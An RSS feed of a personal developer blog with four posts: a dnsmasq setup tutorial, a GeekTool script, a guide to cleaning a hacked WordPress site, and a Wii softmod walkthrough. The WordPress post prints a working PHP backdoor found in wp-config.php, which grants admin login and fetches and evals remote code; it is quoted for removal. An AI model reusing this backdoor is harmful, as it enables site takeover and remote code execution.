<?xml version="1.0" encoding="utf-8" ?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>   
    <title>Blake Embrey</title>
    <atom:link href="http://localhost:8080/feed.xml" rel="self" type="application/rss+xml"></atom:link>
    <link>http://localhost:8080</link>
    <description></description>
    <pubDate>Tue, 24 Apr 2012 07:28:00 -0700</pubDate>
    <generator>The mighty Wintersmith</generator>
    <language>en</language>
    <item>
      <title>Simplify Local Development with Dnsmasq</title>
      <link>http://localhost:8080/articles/local-development-with-dnsmasq/</link>
      <pubDate>Tue, 24 Apr 2012 07:28:00 -0700</pubDate>
      <guid isPermaLink="true">http://localhost:8080/articles/local-development-with-dnsmasq/</guid>
      <author></author>
      <description>&lt;p&gt;Ever wanted to be able to set up your local domains instantly and never have to worry about your &lt;code&gt;/etc/hosts&lt;/code&gt; again? Me too! A bit of looking around and I discovered a wealth of information about a small &lt;em&gt;DNS Forwarder&lt;/em&gt; called DNSMASQ.

&lt;/p&gt;
&lt;p&gt;So, this is great. We have our solution - it&apos;s a tiny program barely taking 700KB of RAM, and it&apos;s a cinch to set up. By the end of this post, you will have a working TLD for use with your local development applications. No more playing with your &lt;code&gt;/etc/hosts&lt;/code&gt; file every time you want to add a new domain.

&lt;/p&gt;
&lt;p&gt;In this tutorial, I will be focusing on Mac as it is the OS I use, however, the instructions should be fairly similar on linux. It has been tested in Mountain Lion and should work without a hiccup all the way down to Leopard (probably lower).

&lt;/p&gt;
&lt;p&gt;First of all, if you haven&apos;t installed it already, we will install &lt;strong&gt;homebrew&lt;/strong&gt; - the missing package manager for OS X. To install, just follow the instructions available on &lt;a href=&quot;http://mxcl.github.com/homebrew/&quot;&gt;the homepage&lt;/a&gt; or just copy and paste this snippet into terminal:

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/bin/ruby -e &quot;$(/usr/bin/curl -fksSL https://raw.github.com/mxcl/homebrew/master/Library/Contributions/install_homebrew.rb)&quot;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Once brew is installed, we&apos;ll install dnsmasq using &lt;code&gt;brew install dnsmasq&lt;/code&gt;

&lt;/p&gt;
&lt;p&gt;Next, let&apos;s activate dnsmasq. Homebrew should have output some hints on how to get started, but in case you missed it  should be something along these lines.

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cp /usr/local/Cellar/dnsmasq/2.57/dnsmasq.conf.example /usr/local/etc/dnsmasq.conf
sudo cp /usr/local/Cellar/dnsmasq/2.57/homebrew.mxcl.dnsmasq.plist /Library/LaunchDaemons
sudo launchctl load -w /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Brilliant, now let&apos;s modify our configuration file at &lt;code&gt;/usr/local/etc/dnsmasq.conf&lt;/code&gt;:

&lt;/p&gt;
&lt;p&gt;We&apos;ll add two rules. The first is the address, or TLD, we will listen to. In this case we will use &lt;code&gt;.dev&lt;/code&gt;, but you can use anything (except &lt;code&gt;.local&lt;/code&gt; - &lt;a href=&quot;http://www.justincarmony.com/blog/2011/07/27/mac-os-x-lion-etc-hosts-bugs-and-dns-resolution/&quot;&gt;not a good idea&lt;/a&gt;)

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;address=/dev/127.0.0.1
listen-address=127.0.0.1&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To start and stop dnsmasq, simply use

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo launchctl stop homebrew.mxcl.dnsmasq &amp;&amp; sudo launchctl start homebrew.mxcl.dnsmasq&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However, I found it even easier to just kill the script in the Activity Monitor. For the final step, add &lt;code&gt;127.0.0.1&lt;/code&gt; as a name server in &lt;code&gt;System Preferences -&gt; Network -&gt; Advanced -&gt; DNS&lt;/code&gt;. You can add it along with some other DNS records, just make sure it&apos;s at the top. For example, I use Google&apos;s Public DNS - &lt;code&gt;8.8.8.8&lt;/code&gt; and &lt;code&gt;8.8.4.4&lt;/code&gt;.

&lt;/p&gt;
&lt;p&gt;Now in whichever language you are writing in, you should be able to easily set up your virtual hosts for use on the &lt;code&gt;.dev&lt;/code&gt; TLD. You should be even able to see your name server setup using &lt;code&gt;scutil --dns&lt;/code&gt;.

&lt;/p&gt;
&lt;p&gt;References:

&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://serverfault.com/a/164215&quot;&gt;ServerFault Question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.philippklaus.de/2012/02/install-dnsmasq-locally-on-mac-os-x-via-homebrew/&quot;&gt;Install DNSmasq locally on Mac OS X via Homebrew&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Change Desktop Background with Shell and GeekTool</title>
      <link>http://localhost:8080/articles/geektool-change-desktop-background/</link>
      <pubDate>Sun, 30 Oct 2011 12:00:00 -0700</pubDate>
      <guid isPermaLink="true">http://localhost:8080/articles/geektool-change-desktop-background/</guid>
      <author></author>
      <description>&lt;p&gt;Make an AppleScript and run it using the &quot;Shell&quot; geeklet provided in GeekTool. First, we’ll make the &apos;AppleScript&apos;. So, open the AppleScript Editor app to get started. Copy and paste this code:

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tell application &quot;Finder&quot;
  set desktop picture to POSIX file &quot;file://localhost/  yourimage.png&quot;
end tell&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then, replace &lt;code&gt;file://localhost/yourimage.png&lt;/code&gt; with the location to your image. It must be an absolute path to the image, so you might want to make a folder just for your GeekTool scripts somewhere. For example, I want to use the Tron background image, so I used &lt;code&gt;file://localhost/Users/blakeembrey/Dropbox/Application Settings/GeekTool/TronLegacy.png&lt;/code&gt;. I am currently storing my GeekTool scripts in an &apos;Applications&apos; folder inside my documents, as you can see. Once I finished that, I saved the script as &lt;code&gt;setTronBackground&lt;/code&gt; in the same folder.

&lt;/p&gt;
&lt;p&gt;Now in Geektool, drag the shell geeklet to the desktop from GeekTool. It doesn’t matter where it goes since it isn’t going to be seen anyway. Set the &apos;group&apos; you would like it to be a part of, then set the &apos;Refresh Every&apos; to 0. For the shell code, we are going to use something like

&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;osascript ~/Documents/Applications/GeekTool/setTronBackground.scpt&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Notice we can use the relative location here, and that we need .scpt for the file extension. Finally, save and close GeekTool. Now every time you change the theme you will also change the background image.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Warning - Something's Not Right Here</title>
      <link>http://localhost:8080/articles/warning-somethings-not-right/</link>
      <pubDate>Fri, 30 Sep 2011 12:00:00 -0700</pubDate>
      <guid isPermaLink="true">http://localhost:8080/articles/warning-somethings-not-right/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;img src=&quot;http://d.pr/i/Ap8y+&quot; alt=&quot;Chrome is broken :/&quot;&gt;

&lt;/p&gt;
&lt;p&gt;About two days ago, I received a warning from Google saying my website has been exploited and hacked. Of course, the emails they sent I never received, so I didn’t realise I had an issue until about an hour ago. My first reaction was OMG, WTF! I knew it most likely had something to do with the recent TimThumb exploit, but I didn’t even know my theme had TimThumb included. I also looked at the Google diagnostic repost which it linked me to, which I found the malware related to &lt;code&gt;counter-wordpress.com&lt;/code&gt;.

&lt;/p&gt;
&lt;p&gt;First of all, I would advise running the script found at &lt;a href=&quot;http://blog.sucuri.net/2011/08/timthumb-php-security-vulnerability-just-the-tip-of-the-iceberg.html&quot;&gt;Sucuri&lt;/a&gt;. Then, scan your site using the &lt;a href=&quot;http://sitecheck.sucuri.net/scanner/&quot;&gt;Sucuri Site Scanner&lt;/a&gt; to find out which pages they have exploited and how. This is the best little site I have found for this, and I would definitely bookmark it for future refernce as well if I were you.

&lt;/p&gt;
&lt;p&gt;Extremely quickly, I jumped to action. This is the exact steps I took and you can take too, to remove the exploits from your code:

&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Delete the following files:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;wp-admin/upd.php
wp-content/upd.php&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Log into WordPress admin and reinstall your WordPress version. We are focusing on these three files:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;wp-settings.php
wp-includes/js/jquery/jquery.js
wp-includes/js/l10n.js&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Open &quot;&lt;code&gt;wp-config.php&lt;/code&gt;&quot; and look for anything that seems out of place. In mine, I found a script which appears to harvest login credentials/cookies, which found on the 2000 or so line. Above and a few thousand lines below were all blank:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;])&amp;&amp; &lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pass'&lt;/span&gt;])){
&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pass'&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;'19ca14e7ea6328a42e0eb13d585e4c22'&lt;/span&gt;){
&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;string&quot;&gt;'login'&lt;/span&gt;){
&lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;'admin'&lt;/span&gt;;
&lt;span class=&quot;variable&quot;&gt;$user&lt;/span&gt; = get_userdatabylogin(&lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt;);
&lt;span class=&quot;variable&quot;&gt;$user_id&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$user&lt;/span&gt;-&gt;ID;
wp_set_current_user(&lt;span class=&quot;variable&quot;&gt;$user_id&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt;);
wp_set_auth_cookie(&lt;span class=&quot;variable&quot;&gt;$user_id&lt;/span&gt;);
do_action(&lt;span class=&quot;string&quot;&gt;'wp_login'&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt;);
}
&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;string&quot;&gt;'exec'&lt;/span&gt;)&amp;&amp;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]))){
&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt; = curl_init(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]);
&lt;span class=&quot;variable&quot;&gt;$fnm&lt;/span&gt; = md5(rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;)).&lt;span class=&quot;string&quot;&gt;'.php'&lt;/span&gt;;
&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt; = fopen(&lt;span class=&quot;variable&quot;&gt;$fnm&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;w&quot;&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_FILE, &lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;);
curl_exec(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
curl_close(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
fclose(&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt;);
&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&lt;SCRIPT LANGUAGE=&quot;&lt;/span&gt;JavaScript&lt;span class=&quot;string&quot;&gt;&quot;&gt;location.href='$fnm';&lt;/SCRIPT&gt;&quot;&lt;/span&gt;;
}
&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;string&quot;&gt;'eval'&lt;/span&gt;)&amp;&amp;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]))){
&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt; = curl_init(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]);
curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);
curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;);
&lt;span class=&quot;variable&quot;&gt;$re&lt;/span&gt; = curl_exec(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
curl_close(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
&lt;span class=&quot;keyword&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$re&lt;/span&gt;);
}}}&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;In your theme, look for anywhere the TimThumb script may be storing the cached files. These are generally along the lines of:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;wp-content/themes/theme-name/scripts/cache/external_{MD5Hash}.php
wp-content/themes/theme-name/temp/cache/external_{MD5Hash}.php&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you found anything like the above, delete it straight away. If you&apos;re not sure, delete every file that isn’t an image.

&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Replace &lt;code&gt;timthumb.php&lt;/code&gt; with the latest version found at &lt;code&gt;http://timthumb.googlecode.com/svn/trunk/timthumb.php&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Change your MySQL and login password and update wp-config.php to correspond with the update.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Change the secret keys in &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Clear your browsers cache and cookies.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Empty any page caching plugins you may have enabled to push the updates through to your visitors.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Throughout this, I also found a botting script and some spam black hat links. Make sure you scan your site using the &lt;a href=&quot;http://sitecheck.sucuri.net/scanner/&quot;&gt;Sucuri Site Scanner&lt;/a&gt; once again to make sure you removed all the exploits. When you are sure you have removed everything, submit your site to Google for review. This can be done in the &lt;code&gt;Diagnostics -&gt; Malware&lt;/code&gt; tab of your Google Webmaster account. To keep up with anymore potential exploits, I would recommend following their fantastic blog found at &lt;a href=&quot;http://blog.sucuri.net/&quot;&gt;blog.sucuri.net&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Jailbreak Wii (Softmod) 3.0 – 4.2</title>
      <link>http://localhost:8080/articles/wii-jailbreak-3-0-4-2/</link>
      <pubDate>Tue, 12 Apr 2011 12:00:00 -0700</pubDate>
      <guid isPermaLink="true">http://localhost:8080/articles/wii-jailbreak-3-0-4-2/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;img src=&quot;http://d.pr/i/SvZy+&quot; alt=&quot;Homebrew Channel&quot;&gt;

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANT: This information is for research and academic purposes only! This info is not to be abused! I am not responsible for any damage that you may create!&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;Although I did successfully complete this guide on my own Wii console, it does not mean that this same process will successfully jailbreak your Wii console. Make sure you read and complete all steps appropriately.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;


&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check your Wii version. This can be done by going to &lt;code&gt;Wii Settings -&gt; Top Right Corner -&gt; Your Wii&apos;s Firmware &amp; Region&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Jailbreak file [3.0-4.1] – &lt;a href=&quot;http://www.mediafire.com/?rv3w0le0nrf7mm1&quot;&gt;Mediafire&lt;/a&gt; (Password is &lt;code&gt;wiihacks&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Jailbreak file [4.2] – &lt;a href=&quot;http://www.mediafire.com/?9ulaa2elqvu7z4z&quot;&gt;Mediafire&lt;/a&gt; (Password is &lt;code&gt;wiihacks&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;SD card with 1GB or more.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Preparation&lt;/strong&gt;

&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Format your SD card to FAT32 or FAT16&lt;/li&gt;
&lt;li&gt;Make Sure WiiConnect 24 is OFF&lt;/li&gt;
&lt;li&gt;Unzip the previously downloaded jailbreak pack and place the files/folders onto the root of your SD card.&lt;/li&gt;
&lt;li&gt;Always launch md5summer.exe to verify that the files have been downloaded properly and they are not corrupted.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Step 1 – Installing Homebrew Channel and Bootmii&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[3.0-4.1]&lt;/strong&gt; Go to Wii Options, then go to &lt;code&gt;Data Management -&gt; Channels -&gt; SD Card&lt;/code&gt;, click on &lt;code&gt;Bannerbomb channel&lt;/code&gt;, you will get a message saying &quot;Load boot.elf/dol?&quot;, select &apos;Yes&apos; and the Hackmii installer will run.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[4.2]&lt;/strong&gt; Click the SD Card Icon on the Wii Menu – &quot;Load boot.elf/dol?&quot;, select &apos;Yes&apos; and the Hackmii installer will run.

&lt;/p&gt;
&lt;p&gt;In the Hackmii Installer, make sure to install the Homebrew Channel. If you can, also install Bootmii as boot2. When installing bootmii select prepare SD card, then install. &quot;Bootmii as IOS&quot; is installed automatically.

&lt;/p&gt;
&lt;p&gt;(If you receive an error stating “No vulnerable IOS”, &lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/29080-hackmii-fix-no-vulnerable-ios-black-screen-scam-freeze.html&quot;&gt;complete these steps&lt;/a&gt;.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 2 – Backup Your Wii&apos;s NAND (required)&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;It is highly recommended to make a NAND Backup with bootmii as it can save you from 99% of bricks. That is, if you can install bootmii as boot2. You&apos;ll need a SD Card with at least 550 MB free on it. Also, note bootmii can be picky about SD Cards so its best to avoid generic ones. The 2GB Sandisk SD Card is recommended.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; Place the SD Card into your wii and power it on. If bootmii was installed as boot2, the bootmii screen should automatically appear, if it was installed as an IOS, then you&apos;ll have to go to homebrew channel, press &quot;home&quot; on your wiimote then select &quot;Launch Bootmii&quot;

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; Navigate using the power/reset buttons on the front of your console and select the icon with the gears on it. If the console buttons don&apos;t work, you&apos;ll have to use a gamecube controller.

&lt;/p&gt;
&lt;p&gt;Power = Browse
Reset = Select

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Now select the icon that has the Green arrow pointing to a SD Card but from the chip. Then follow the on-screen instructions to backup your NAND.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;d)&lt;/strong&gt; In 10 – 15 minutes, the NAND Backup should be complete. You may get a few bad blocks but any number of bad blocks under 80 is normal and fine. Once all is done, you can exit bootmii.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;e)&lt;/strong&gt; Remove the SD Card from your wii and insert into your PC, backup the &apos;bootmii&apos; folder, the &apos;NAND.bin&apos; file and &apos;key.bin&apos; file from your sd card onto a safe place on your PC. Once these files/folders are on your PC, delete them from your SD Card. If you do not and bootmii as boot2 is installed, it will load everytime!

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;DO NOT LOSE YOUR NAND.BIN OR KEYS.BIN&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;If you were to ever fully brick the wii, just copy the bootmii folder and &apos;NAND.bin&apos; from your PC onto the root of your SD Card. Then repeat parts &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; &amp; &lt;code&gt;c&lt;/code&gt; but this time selecting the icon that points to the chip. While &lt;code&gt;bootmii&lt;/code&gt;/&lt;code&gt;boot2&lt;/code&gt; can save you from full bricks, &lt;code&gt;bootmii&lt;/code&gt;/&lt;code&gt;IOS&lt;/code&gt; cannot! It is not recommended to use &lt;code&gt;bootmii&lt;/code&gt; as an &lt;code&gt;IOS&lt;/code&gt; to restore your NAND! If you can only install as an &lt;code&gt;IOS&lt;/code&gt;, your nand backup is still useful, keep it safe.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 3 – Modding your Wii (the jailbreak)&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[3.0-4.1 Only]&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; Put the SD card into the Wii

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; Open The Homebrew channel and select Multi-Mod Manager. Go to &lt;code&gt;Install &amp; Patch iOS36 -&gt; Express Install&lt;/code&gt; - When completed press &lt;code&gt;B&lt;/code&gt; to go back into main menu go to the bottom choice &lt;code&gt;Load Another IOS&lt;/code&gt; and select &lt;code&gt;IOS236&lt;/code&gt; (this should already be selected).

&lt;/p&gt;
&lt;p&gt;In Multi-Mod Manager go into &lt;code&gt;Wad Manager&lt;/code&gt;, it should display these wads.

&lt;/p&gt;
&lt;p&gt;(These are to softmod your Wii)

&lt;/p&gt;
&lt;p&gt;  iOS60-[6174]-Patched.wad
  cIOS249[56]-rev20.wad
  cIOS250[57]-rev65535.wad
  cIOS223[37+38]-rev4.wad
  cIOS222[38]-rev4.wad

&lt;/p&gt;
&lt;p&gt;(These are to install the extra IOS files)

&lt;/p&gt;
&lt;p&gt;  iOS53-64-v5663.wad
  iOS55-64-v5663.wad
  iOS56-64-v5662.wad
  iOS57-64-v5919.wad
  iOS58-64-v6176.wad

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Press 1 on Wiimote to install all these wads at once, Press A to confirm. If you get an error do not exit until they all install correctly. Retry installing

&lt;/p&gt;
&lt;p&gt;After it installs correctly press the HOME button on Wiimote until you&apos;re back in main Multi-Mod Manager Menu.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[4.2 Only]&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; SD card in the Wii
&lt;strong&gt;b)&lt;/strong&gt; Open The Homebrew channel and select Multi-Mod Manager. Go to &lt;code&gt;Install &amp; Patch iOS36 -&gt; Express Install&lt;/code&gt; - Once completed press B to go back into main menu go to the bottom choice &lt;code&gt;Load Another IOS&lt;/code&gt; and select &lt;code&gt;IOS236&lt;/code&gt; (this should already be selected).

&lt;/p&gt;
&lt;p&gt;In Multi-Mod Manager go into Wad Manager, it should display these wads.

&lt;/p&gt;
&lt;p&gt;(These are to softmod your wii)

&lt;/p&gt;
&lt;p&gt;  iOS70-[6687]-Patched.wad
  cIOS249[56]-rev20.wad
  cIOS250[57]-rev65535.wad
  cIOS222[38]-rev4.wad
  cIOS223[37+38]-rev4.wad

&lt;/p&gt;
&lt;p&gt;(These are the IOS your Wii needs)

&lt;/p&gt;
&lt;p&gt;  iOS56-64-v5662.wad
  iOS57-64-v5919.wad
  iOS58-64-v6176.wad

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Press 1 on wiimote to install all these wads at once, Press A to confirm. If you get an error do not exit until they install correctly. Retry installing.

&lt;/p&gt;
&lt;p&gt;After they have all installed correctly press the B button on Wiimote until you&apos;re back in main Multi-Mod Manager Menu.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 4 – Installing Priiloader&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HBC -&gt; Load up MMM&lt;/code&gt;. Make sure where it says Load another ios [IOS236 is Selected]

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; &lt;code&gt;Multi-Mod Manager -&gt; App Manager -&gt; Select Priiloader&lt;/code&gt;

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; It Should Load up Press + to Install

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Your Wii should reboot into Homebrew Channel after the installation. Press the HOME button and power off your Wii. Hold reset on the console while turning it on to boot into Priiloader. Go to System Menu Hacks and enable &apos;Block Disc Updates&apos; &amp; &apos;Block Online Updates&apos;, select &apos;Save Settings&apos; when finished. Press B on the Wiimote to go back to the main menu, next go to Settings and use the d-pad to set Autoboot: System Menu. Then select Save Settings. Press B to go back to the main menu.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;d)&lt;/strong&gt; In the main menu in priiloader, select Launch Title and select the HomeBrew Channel to check if its working properly.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 5 – Getting HBC to use iOS58 for USB2 Support&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;From the Homebrew channel load up the hackmii installer and reinstall the Homebrew channel. This will make it use ios58 for USB2 Support.To check your HBC is using iOS58 press the home button when in HBC and it should tell you in top right corner.

&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Step 6 – Install more apps&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;This is what the whole jailbreak process was for, installing custom apps. Here is a list of some awesome apps, starting at my favourite.

&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiimc.org/downloads/&quot;&gt;WiiMC&lt;/a&gt; – Wii Media Center&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/other-faq-guides-tutorials/68251-guide-homebrew-browser.html&quot;&gt;Homebrew Browser&lt;/a&gt; - Wii Homebrew App Store&lt;/li&gt;
&lt;li&gt;Update the &lt;a href=&quot;http://www.wiihacks.com/general-homebrew-hack-issues/67034-update-shopping-channel-v20-guide.html&quot;&gt;Wii Shopping Channel&lt;/a&gt; to v20&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/47802-play-gamecube-backups-your-wii.html&quot;&gt;Play Gamecube games&lt;/a&gt; on your Wii&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/emulators-downloads/&quot;&gt;Emulators&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/other-faq-guides-tutorials/66235-ftpii-guide.html&quot;&gt;Wii FTP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;And you are done!&lt;/strong&gt;

&lt;/p&gt;
&lt;p&gt;Special thanks to author, &lt;em&gt;Cile&lt;/em&gt;, for the original guide over at &lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/69690-softmod-3-0-4-2-e-u-j-wiis.html&quot;&gt;WiiHacks&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
  </channel>
</rss>